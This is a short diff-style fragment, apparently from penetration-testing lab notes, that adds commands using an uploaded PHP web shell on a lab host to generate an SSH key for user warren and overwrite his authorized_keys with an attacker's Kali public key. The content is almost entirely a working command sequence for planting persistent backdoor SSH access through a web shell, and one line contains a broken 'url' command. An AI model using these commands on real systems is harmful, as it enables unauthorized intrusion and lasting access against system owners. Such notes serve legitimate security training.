@@ -1,2 +1,6 @@
+==============================================================================
+[+] SSH key ad user
+==============================================================================
+ssh-keygen -t rsa
 curl -G http://10.10.10.10/assets/uploads/1682197740_shell.php --data-urlencode 'cmd=ssh-keygen -t rsa -C oscp -f /home/warren/.ssh/id_rsa -P  ""'
 url -G http://10.10.10.10/assets/uploads/1682197740_shell.php --data-urlencode 'cmd=echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcVaWTulsknmbQwOOJIAPNHWYtHFQGNxLwjNTp/lCwbYpga+WzKHuu6RIyaQ+MUg0AXY7rQenfofXhhAVfcuZPcWJ2o/lBiMB2KT+jIhI3BhD3/t39JZkRGdLohyY75FTBsPFi3+TUsVmUIFoR5DEat3ElJ9fKEEk3s4SuXV4VbJCDODFxbSUc9n58xPiZW1vtAiFO4uAdoQvomf09rtjNfo/m3sAtoEJ8vbDcHngpHKyXOZFftiYIYtWlp1/Ey289055JGFL/1ySyLD3NTNtDhmc8OG4gK0tRx3MqyR1rVAJg9VbIEoX6LX1tk14Vwq+dEqNG7C0XT73LhHA9d4PIIAj1JWXuGGNstaUHVVTLw6V3vQyxgNjm5loAIVbJWfFtx3yv5Ui4auNeF+AeV4PEHa0vl9ulRqRsx+NJYRp4sZLRDWW2jrqQ7ux4tUJVErBpp+bFUw8zd/fQKE09dde3ZWFY+2NEPCiqyZygUB+faeNDxt5o9qSvAwY1dzjzrOM= kali@kali" > /home/warren/.ssh/authorized_keys'
